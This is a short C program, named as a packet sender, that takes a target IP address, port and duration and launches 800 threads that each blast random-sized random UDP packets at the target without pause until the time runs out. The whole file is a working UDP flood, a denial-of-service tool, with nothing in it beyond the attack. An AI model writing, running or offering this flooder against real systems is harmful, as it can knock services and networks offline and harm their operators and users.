#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define NUM_THREADS 800
#define MAX_PAYLOAD_SIZE 1024

void usage() {
    printf("Usage: ./packet_sender ip port time\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void generate_random_payload(unsigned char *payload, size_t size) {
    for (size_t i = 0; i < size; i++) {
        payload[i] = rand() % 256;
    }
}

void *send_packets(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;
    
    srand(time(NULL) ^ pthread_self());

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        size_t payload_size = (rand() % MAX_PAYLOAD_SIZE) + 1;
        unsigned char payload[payload_size];
        generate_random_payload(payload, payload_size);

        if (sendto(sock, payload, payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);

    pthread_t thread_ids[NUM_THREADS];
    struct thread_data data = {ip, port, time};

    printf("Sending packets to %s:%d for %d seconds with %d threads\n", ip, port, time, NUM_THREADS);

    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&thread_ids[i], NULL, send_packets, (void *)&data) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
        printf("Thread %lu created.\n", thread_ids[i]);
    }

    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    printf("Packet sending finished.\n");
    return 0;
}
